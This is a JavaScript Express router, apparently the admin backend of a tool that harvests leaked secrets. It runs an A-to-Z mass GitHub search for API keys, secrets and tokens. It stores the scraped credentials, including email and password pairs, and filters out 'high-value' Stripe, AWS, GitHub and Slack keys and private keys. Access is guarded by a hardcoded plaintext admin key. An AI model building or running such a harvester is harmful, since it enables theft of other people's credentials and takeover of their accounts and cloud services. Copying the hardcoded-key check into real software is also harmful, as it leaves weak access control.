const express = require('express');
const router = express.Router();
const credentialScraper = require('../services/credentialScraper');

// Admin authentication middleware
const adminAuth = (req, res, next) => {
  const adminKey = req.headers['x-admin-key'] || req.headers['X-Admin-Key'] || req.body.adminKey;
  if (adminKey === 'Peace@25') {
    next();
  } else {
    res.status(403).json({ error: 'Access denied' });
  }
};

// Mass GitHub scan (A-Z)
router.post('/scraper/mass-github-scan', adminAuth, async (req, res) => {
  try {
    const alphabet = 'abcdefghijklmnopqrstuvwxyz'.split('');
    const allResults = [];

    for (const letter of alphabet) {
      const searchInput = `${letter} api_key OR ${letter} secret OR ${letter} token`;
      const results = await credentialScraper.scrapeAll(searchInput, 'keyword');
      allResults.push(...(results.results || []));
    }

    res.json({
      success: true,
      totalFound: allResults.length,
      results: allResults
    });
  } catch (error) {
    console.error('Mass scan error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Start new scraping job
router.post('/scraper/scan', adminAuth, async (req, res) => {
  try {
    const { searchInput, searchType } = req.body;

    if (!searchInput || !searchType) {
      return res.status(400).json({ error: 'Search input and type required' });
    }

    // Start scraping (async operation)
    const results = await credentialScraper.scrapeAll(searchInput, searchType);

    res.json({
      success: true,
      message: 'Scraping completed',
      ...results
    });
  } catch (error) {
    console.error('Scraper error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Get recent scans
router.get('/scraper/scans', adminAuth, async (req, res) => {
  try {
    const limit = parseInt(req.query.limit) || 50;
    const scans = await credentialScraper.getRecentScans(limit);

    res.json({
      success: true,
      scans
    });
  } catch (error) {
    console.error('Get scans error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Get credentials by search ID
router.get('/scraper/results/:searchId', adminAuth, async (req, res) => {
  try {
    const { searchId } = req.params;
    const credentials = await credentialScraper.getCredentialsBySearch(searchId);

    res.json({
      success: true,
      count: credentials.length,
      credentials
    });
  } catch (error) {
    console.error('Get results error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Get all scraped credentials (paginated)
router.get('/scraper/all-credentials', adminAuth, async (req, res) => {
  try {
    const { pool } = require('../config/database');
    const page = parseInt(req.query.page) || 1;
    const limit = parseInt(req.query.limit) || 100;
    const offset = (page - 1) * limit;
    const category = req.query.category; // Filter by category

    let query = 'SELECT * FROM scraped_credentials';
    let countQuery = 'SELECT COUNT(*) FROM scraped_credentials';
    const params = [];

    // Filter by high-value types only
    if (category === 'high-value') {
      query += ` WHERE credential_type IN ('stripe_key', 'aws_key', 'github_token', 'slack_token', 'private_key')`;
      countQuery += ` WHERE credential_type IN ('stripe_key', 'aws_key', 'github_token', 'slack_token', 'private_key')`;
    }

    query += ' ORDER BY created_at DESC LIMIT $1 OFFSET $2';
    params.push(limit, offset);

    const result = await pool.query(query, params);
    const countResult = await pool.query(countQuery);
    const total = parseInt(countResult.rows[0].count);

    res.json({
      success: true,
      page,
      limit,
      total,
      totalPages: Math.ceil(total / limit),
      credentials: result.rows
    });
  } catch (error) {
    console.error('Get all credentials error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Search credentials by email/domain
router.post('/scraper/search', adminAuth, async (req, res) => {
  try {
    const { query, type } = req.body;
    const { pool } = require('../config/database');

    let sqlQuery;
    let params;

    if (type === 'email') {
      sqlQuery = 'SELECT * FROM scraped_credentials WHERE email ILIKE $1 ORDER BY created_at DESC LIMIT 100';
      params = [`%${query}%`];
    } else if (type === 'domain') {
      sqlQuery = 'SELECT * FROM scraped_credentials WHERE domain ILIKE $1 OR url ILIKE $1 ORDER BY created_at DESC LIMIT 100';
      params = [`%${query}%`];
    } else {
      sqlQuery = 'SELECT * FROM scraped_credentials WHERE raw_data ILIKE $1 ORDER BY created_at DESC LIMIT 100';
      params = [`%${query}%`];
    }

    const result = await pool.query(sqlQuery, params);

    res.json({
      success: true,
      count: result.rows.length,
      credentials: result.rows
    });
  } catch (error) {
    console.error('Search error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Delete credential
router.delete('/scraper/credential/:id', adminAuth, async (req, res) => {
  try {
    const { id } = req.params;
    const { pool } = require('../config/database');

    await pool.query('DELETE FROM scraped_credentials WHERE id = $1', [id]);

    res.json({
      success: true,
      message: 'Credential deleted'
    });
  } catch (error) {
    console.error('Delete error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Stop running scan
router.post('/scraper/stop/:searchId', adminAuth, async (req, res) => {
  try {
    const { searchId } = req.params;
    const stopped = credentialScraper.stopScan(parseInt(searchId));
    
    if (stopped) {
      res.json({
        success: true,
        message: 'Scan stop signal sent',
        searchId
      });
    } else {
      res.json({
        success: false,
        message: 'Scan not found or already completed'
      });
    }
  } catch (error) {
    console.error('Stop scan error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Get active scans
router.get('/scraper/active', adminAuth, async (req, res) => {
  try {
    const activeScans = credentialScraper.getActiveScans();
    res.json({
      success: true,
      activeScans
    });
  } catch (error) {
    console.error('Get active scans error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Find duplicates
router.get('/scraper/duplicates', adminAuth, async (req, res) => {
  try {
    const { pool } = require('../config/database');

    // Find ALL duplicates across entire database (old + new)
    const duplicates = await pool.query(`
      SELECT 
        credential_type,
        COALESCE(api_key, token, email || ':' || password, email, raw_data) as credential_value,
        COUNT(*) as count,
        array_agg(id ORDER BY created_at) as ids,
        array_agg(source) as sources,
        array_agg(search_query) as scan_ids,
        MIN(created_at) as first_seen,
        MAX(created_at) as last_seen
      FROM scraped_credentials
      GROUP BY credential_type, credential_value
      HAVING COUNT(*) > 1
      ORDER BY count DESC
      LIMIT 1000
    `);

    const totalDuplicates = duplicates.rows.reduce((sum, r) => sum + (r.count - 1), 0);

    res.json({
      success: true,
      totalDuplicates,
      duplicateGroups: duplicates.rows.length,
      duplicates: duplicates.rows
    });
  } catch (error) {
    console.error('Find duplicates error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Delete duplicates (keep oldest)
router.post('/scraper/delete-duplicates', adminAuth, async (req, res) => {
  try {
    const { pool } = require('../config/database');

    // Delete duplicates, keeping only the oldest entry
    const result = await pool.query(`
      DELETE FROM scraped_credentials
      WHERE id IN (
        SELECT id FROM (
          SELECT id,
            ROW_NUMBER() OVER (
              PARTITION BY credential_type, 
              COALESCE(api_key, ''), 
              COALESCE(token, ''), 
              COALESCE(email, ''), 
              COALESCE(password, '')
              ORDER BY created_at ASC
            ) as rn
          FROM scraped_credentials
        ) AS subquery
        WHERE rn > 1
      )
    `);

    res.json({
      success: true,
      deleted: result.rowCount,
      message: `Deleted ${result.rowCount} duplicate credentials`
    });
  } catch (error) {
    console.error('Delete duplicates error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Get statistics
router.get('/scraper/stats', adminAuth, async (req, res) => {
  try {
    const { pool } = require('../config/database');

    const totalCreds = await pool.query('SELECT COUNT(*) FROM scraped_credentials');
    const totalScans = await pool.query('SELECT COUNT(*) FROM scraper_searches');
    const byType = await pool.query(
      'SELECT credential_type, COUNT(*) as count FROM scraped_credentials GROUP BY credential_type ORDER BY count DESC'
    );
    const bySource = await pool.query(
      'SELECT source, COUNT(*) as count FROM scraped_credentials GROUP BY source ORDER BY count DESC'
    );
    const bySeverity = await pool.query(
      'SELECT severity, COUNT(*) as count FROM scraped_credentials GROUP BY severity ORDER BY count DESC'
    );

    res.json({
      success: true,
      stats: {
        totalCredentials: parseInt(totalCreds.rows[0].count),
        totalScans: parseInt(totalScans.rows[0].count),
        byType: byType.rows,
        bySource: bySource.rows,
        bySeverity: bySeverity.rows
      }
    });
  } catch (error) {
    console.error('Stats error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

module.exports = router;
